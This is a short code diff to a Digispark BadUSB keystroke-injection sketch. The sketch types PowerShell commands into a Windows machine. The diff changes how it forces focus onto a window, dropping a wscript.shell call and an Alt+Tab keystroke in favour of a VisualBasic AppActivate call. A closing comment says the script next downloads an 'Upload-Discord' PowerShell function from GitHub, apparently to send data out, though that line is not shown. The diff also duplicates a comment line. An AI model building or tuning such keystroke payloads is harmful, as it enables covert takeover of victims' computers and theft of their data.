@@ -32,12 +32,12 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter
 
   // brings focus to the PS window
+  // brings focus to the PS window
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("$wshell = New-Object -ComObject wscript.shell");
+  DigiKeyboard.println('[void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic")');
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("$wshell.AppActivate('powershell')");
+  DigiKeyboard.println("[Microsoft.VisualBasic.Interaction]::AppActivate((Get-Process -Name notepad).MainWindowTitle)");
   DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); // Alt + Tab
 
   // downloads the Upload-Discord PS function from GitHub
   DigiKeyboard.delay(1000);
